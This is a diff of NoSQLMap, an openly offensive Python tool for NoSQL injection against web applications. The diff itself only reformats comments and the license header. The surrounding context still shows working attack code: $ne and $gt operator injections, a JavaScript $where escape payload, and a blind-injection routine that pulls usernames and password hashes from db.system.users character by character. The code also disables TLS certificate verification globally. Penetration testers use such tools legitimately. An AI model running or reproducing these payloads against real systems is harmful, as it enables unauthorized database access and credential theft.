@@ -1,17 +1,7 @@
 #!/usr/bin/python
-#NoSQLMap Copyright 2016 Russell Butturini
-#This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-#the Free Software Foundation, either version 3 of the License, or
-#(at your option) any later version.
+# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
+# See the file 'doc/COPYING' for copying permission
 
-#This program is distributed in the hope that it will be useful,
-#but WITHOUT ANY WARRANTY; without even the implied warranty of
-#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#GNU General Public License for more details.
-
-#You should have received a copy of the GNU General Public License
-#along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 import urllib
 import urllib2
@@ -22,11 +12,12 @@ import datetime
 import time
 import random
 
-#Fix for dealing with self-signed certificates.  This is wrong and highly discouraged, but it's a hacking tool, so it's fixed with a hack.  Get over it :-)
+# Fix for dealing with self-signed certificates.  This is wrong and highly discouraged, to be revisited in stable branch
 
 if version_info >= (2, 7, 9):
     import ssl
     ssl._create_default_https_context = ssl._create_unverified_context
+
 
 def getApps(webPort,victim,uri,https,verb,requestHeaders):
     print "Web App Attacks (GET)"
@@ -55,7 +46,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
     global int24
     int24 = False
 
-    #Verify app is working.
+    # Verify app is working.
     print "Checking to see if site at " + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip() + " is up..."
 
     if https == "OFF":
@@ -94,8 +85,8 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
         injectString = randInjString(int(injectSize))
         print "Using " + injectString + " for injection testing.\n"
 
-        #Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
-        #Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
+        # Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
+        # Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
         if "?" not in appURL:
             print "No URI parameters provided for GET request...Check your options.\n"
             raw_input("Press enter to continue...")
@@ -124,7 +115,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
         else:
             print "Test 1: PHP/ExpressJS != associative array injection"
 
-        #Test for errors returned by injection
+        # Test for errors returned by injection
         req = urllib2.Request(uriArray[1], None, requestHeaders)
         errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
@@ -173,7 +164,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
         else:
             testNum +=1
 
-        #Start a single record attack in case the app expects only one record back
+        # Start a single record attack in case the app expects only one record back
         print "\n"
         if verb == "ON":
             print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
@@ -355,6 +346,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders):
     raw_input("Press enter to continue...")
     return()
 
+
 def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
     print "Web App Attacks (POST)"
     print "==============="
@@ -377,7 +369,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
     global gtDict
     testNum = 1
 
-    #Verify app is working.
+    # Verify app is working.
     print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
 
     if https == "OFF":
@@ -434,8 +426,8 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         injectString = randInjString(int(injectSize))
         print "Using " + injectString + " for injection testing.\n"
 
-        #Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
-        #Add error handling for Non-200 HTTP response codes if random strings freak out the app.
+        # Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
+        # Add error handling for Non-200 HTTP response codes if random strings freak out the app.
         postData.update({injOpt:injectString})
         if verb == "ON":
             print "Checking random injected parameter HTTP response size sending " + str(postData) +"...\n"
@@ -455,7 +447,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
         else:
             print "Random value variance: " + str(randNormDelta) + "\n"
 
-        #Generate not equals injection
+        # Generate not equals injection
         neDict = postData
         neDict[injOpt + "[$ne]"] = neDict[injOpt]
         del neDict[injOpt]
@@ -478,10 +470,10 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
             testNum +=1
         print "\n"
 
-        #Delete the extra key
+        # Delete the extra key
         del postData[injOpt + "[$ne]"]
 
-        #generate $gt injection
+        # generate $gt injection
         gtDict = postData
         gtDict.update({injOpt:""})
         gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
@@ -541,7 +533,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
             testNum += 1
         print "\n"
 
-        #Start a single record attack in case the app expects only one record back
+        # Start a single record attack in case the app expects only one record back
         postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
         body = urllib.urlencode(postData)
         req = urllib2.Request(appURL,body, requestHeaders)
@@ -717,6 +709,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
     raw_input("Press enter to continue...")
     return()
 
+
 def errorTest (errorCheck,testNum):
     global possAddrs
     global httpMethod
@@ -821,6 +814,7 @@ def checkResult(baseSize,respSize,testNum,verb,postData):
             else:
                 possAddrs.append(str(postData))
         return
+
 
 def randInjString(size):
     print "What format should the random string take?"
@@ -970,6 +964,7 @@ def buildUri(origUri, randValue):
 
     return uriArray[0]
 
+
 def getDBInfo():
     curLen = 0
     nameLen = 0
@@ -1039,7 +1034,7 @@ def getDBInfo():
     if getUserInf.lower() == "y":
         charCounter = 0
         nameCounter = 0
-        #find the total number of users on the database
+        # find the total number of users on the database
         while gotUserCnt == False:
             usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
 
@@ -1053,11 +1048,11 @@ def getDBInfo():
             else:
                 usrCount += 1
 
-        usrChars = 0  #total number of characters in username
-        charCounterUsr = 0 #position in the character array-Username
-        rightCharsUsr = 0 #number of correct characters-Username
-        rightCharsHash = 0 #number of correct characters-hash
-        charCounterHash = 0 #position in the character array-hash
+        usrChars = 0  # total number of characters in username
+        charCounterUsr = 0 # position in the character array-Username
+        rightCharsUsr = 0 # number of correct characters-Username
+        rightCharsHash = 0 # number of correct characters-hash
+        charCounterHash = 0 # position in the character array-hash
         username = ""
         pwdHash = ""
         charCountUsr = False
@@ -1066,14 +1061,14 @@ def getDBInfo():
         while retrUsers < usrCount:
             if retrUsers == 0:
                 while charCountUsr == False:
-                    #different query to get the first user vs. others
+                    # different query to get the first user vs. others
                     usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
 
                     req = urllib2.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(urllib2.urlopen(req).read()))
 
                     if lenUri == baseLen:
-                        #Got the right number of characters
+                        # Got the right number of characters
                         charCountUsr = True
 
                     else:
@@ -1096,7 +1091,7 @@ def getDBInfo():
 
                 retrUsers += 1
                 users.append(username)
-                #reinitialize all variables and get ready to do it again
+                # reinitialize all variables and get ready to do it again
                 #print str(retrUsers)
                 #print str(users)
                 charCountUsr = False
@@ -1121,20 +1116,20 @@ def getDBInfo():
 
                 hashes.append(pwdHash)
                 print "Got user:hash " + users[0] + ":" + hashes[0]
-                #reinitialize all variables and get ready to do it again
+                # reinitialize all variables and get ready to do it again
                 charCounterHash = 0
                 rightCharsHash = 0
                 pwdHash = ""
             else:
                 while charCountUsr == False:
-                    #different query to get the first user vs. others
+                    # different query to get the first user vs. others
                     usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
 
                     req = urllib2.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(urllib2.urlopen(req).read()))
 
                     if lenUri == baseLen:
-                        #Got the right number of characters
+                        # Got the right number of characters
                         charCountUsr = True
 
                     else:
@@ -1156,7 +1151,7 @@ def getDBInfo():
                         charCounterUsr += 1
 
                 retrUsers += 1
-                #reinitialize all variables and get ready to do it again
+                # reinitialize all variables and get ready to do it again
 
                 charCountUsr = False
                 rightCharsUsr = 0
@@ -1179,7 +1174,7 @@ def getDBInfo():
                 users.append(username)
                 hashes.append(pwdHash)
                 print "Got user:hash " + users[retrUsers-1] + ":" + hashes[retrUsers-1]
-                #reinitialize all variables and get ready to do it again
+                # reinitialize all variables and get ready to do it again
                 username = ""
                 charCounterHash = 0
                 rightCharsHash = 0
